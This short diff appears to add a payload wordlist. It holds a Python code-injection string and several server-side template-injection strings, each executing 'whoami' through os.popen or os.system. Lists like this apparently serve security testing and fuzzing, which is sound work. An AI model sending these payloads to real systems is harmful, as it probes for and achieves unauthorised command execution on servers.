@@ -1,0 +1,4 @@
+__import__('os').popen('whoami').read();
+
+{% import foobar %} = Error
+{% import os %}{{os.system('whoami')}}
